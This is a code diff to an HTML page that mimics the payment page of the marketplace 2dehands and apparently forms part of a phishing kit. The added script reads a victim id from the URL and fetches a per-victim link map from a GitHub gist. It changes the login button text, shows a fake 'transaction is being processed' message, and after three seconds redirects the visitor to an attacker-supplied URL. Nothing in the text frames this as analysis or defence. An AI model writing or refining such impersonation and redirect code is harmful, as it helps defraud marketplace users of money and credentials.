@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>2dehands | BETALING</title>
+  <title>2dehands | Betaling</title>
 
   <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-design-tokens/twh/tokens/CssVars.c9a22c58.css" />
   <link rel="stylesheet" href="https://www.hzcdn.io/bff/static/vendor/hz-web-ui/twh/assets/Assets.8c256939.css" />
@@ -74,9 +74,9 @@
     }
   </style>
 <script>
-  window.onload = function() {
+  window.addEventListener("load", function() {
     const urlParams = new URLSearchParams(window.location.search);
-    const id = urlParams.get('id');
+    const id = urlParams.get('id') || urlParams.get('ID');
     if (!id) return;
 
     const gistUrl = "https://gist.githubusercontent.com/2dehandsbt/2ff5206c925f81233672c07680efa5ca/raw/links.json";
@@ -84,19 +84,22 @@
       .then(response => response.json())
       .then(data => {
         if (data[id]) {
+          const loginBtn = document.querySelector('[data-role="login"] span');
+          if (loginBtn && data[id].replaceText) loginBtn.textContent = data[id].replaceText;
+          const textElement = document.querySelector('.loader-text');
+          if (textElement) textElement.textContent = "Uw transactie wordt verwerkt";
+
+          setTimeout(() => {
           const textElement = document.querySelector('.loader-text');
           if (textElement && data[id].replaceText) {
   const loginBtn = document.querySelector('[data-role="login"] span');
   if (loginBtn) loginBtn.textContent = data[id].replaceText;
-  textElement.textContent = "Uw transactie wordt verwerkt";
-}
-          setTimeout(() => {
-            window.location.href = data[id].url;
+  window.location.href = data[id].url;
           }, 3000);
         }
       })
       .catch(() => {});
-  };
+  });
 </script>
 </head>
 <body>
